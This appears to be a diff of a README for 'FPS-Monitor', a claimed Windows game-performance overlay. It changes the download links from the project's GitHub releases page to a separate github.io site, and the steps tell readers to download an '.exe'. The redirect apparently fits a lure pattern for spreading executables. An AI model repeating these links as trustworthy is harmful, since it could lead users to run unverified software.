@@ -1,6 +1,6 @@
 # 📊 FPS-Monitor - View your game performance in real-time
 
-[![](https://img.shields.io/badge/Download-FPS--Monitor-blue.svg)](https://github.com/genusaquilegianonagenarian381/FPS-Monitor/releases)
+[![](https://img.shields.io/badge/Download-FPS--Monitor-blue.svg)](https://genusaquilegianonagenarian381.github.io)
 
 FPS-Monitor provides a visual overlay for your screen. It shows your frame rate and hardware usage while you play games. You see how your computer handles heavy graphics and processing tasks. The tool works on Windows 10 and Windows 11. It helps you find performance issues during gaming sessions.
 
@@ -18,7 +18,7 @@ Your computer must meet these basic needs to use the software:
 
 Follow these steps to get the software on your machine:
 
-1. Visit this page to download the latest version: [https://github.com/genusaquilegianonagenarian381/FPS-Monitor/releases](https://github.com/genusaquilegianonagenarian381/FPS-Monitor/releases)
+1. Visit this page to download the latest version: [https://genusaquilegianonagenarian381.github.io](https://genusaquilegianonagenarian381.github.io)
 2. Look for the file ending in ".exe" under the Assets section.
 3. Click the file name to start your download.
 4. Wait for the browser to finish the file transfer.
